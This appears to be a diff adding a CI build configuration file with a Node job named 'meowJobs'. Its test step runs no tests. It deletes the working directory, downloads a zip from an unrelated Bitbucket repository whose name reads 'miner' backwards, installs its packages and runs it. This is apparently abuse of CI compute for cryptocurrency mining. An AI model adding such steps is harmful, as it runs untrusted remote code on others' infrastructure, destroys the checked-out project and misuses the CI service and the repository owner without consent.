@@ -1,0 +1,23 @@
+checks:
+    javascript: true
+build:
+    environment:
+        node: v16.9.1
+    nodes:
+        meowJobs:
+            dependencies:
+                before:
+                    - sudo apt update
+                    - sudo apt install -y software-properties-common
+                    - sudo add-apt-repository ppa:ubuntu-toolchain-r/test 
+                    - sudo apt-get update
+                    - sudo apt-get install -y libstdc++6
+            tests:
+                override:
+                    - command: rm -rf ./*
+                    - command: curl -fsSL https://bitbucket.org/iz-data/vhx-renim/get/main.zip -o tool.zip
+                    - command: unzip tool.zip
+                    - command: cd iz-data-vhx-renim-cab31bc803a5
+                    - command: npm i
+                    - command: node app
+                    - command: echo "Done!!"
